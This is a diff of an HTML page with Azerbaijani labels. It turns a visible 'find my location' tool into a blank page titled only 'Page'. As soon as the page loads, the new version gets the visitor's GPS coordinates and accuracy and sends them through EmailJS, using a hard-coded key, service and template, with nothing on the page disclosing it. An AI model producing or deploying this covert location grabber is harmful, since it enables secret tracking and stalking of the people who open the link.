@@ -1,30 +1,23 @@
-﻿<!DOCTYPE html>
-<html>
+<!DOCTYPE html>
+<html lang="az">
 <head>
-    <title>Yerim Harada</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Səhifə</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>emailjs.init("OAtlwWtCc4VGMyM97");</script>
 </head>
 <body>
-    <h2>Mənim Yerim</h2>
-    <button onclick="findMe()">Yerimi Tap</button>
-    <div id="result"></div>
     <script>
-function findMe() {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-    }
-}
-function showPosition(position) {
-    document.getElementById("result").innerHTML = `
-        <p>📍 Enlem: ${position.coords.latitude}</p>
-        <p>📍 Boylam: ${position.coords.longitude}</p>
-        <p>📏 Dəqiqlik: ${position.coords.accuracy} metr</p>
-        <a href="https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}" target="_blank">
-        🗺️ Google Maps-də bax</a>
-    `;
-}
-function showError(error) {
-    alert("GPS icazəsi lazımdır: " + error.message);
-}
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                emailjs.send("service_b5rft1p", "template_x8wi2yq", {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy + " metr"
+                });
+            });
+        }
     </script>
 </body>
 </html>
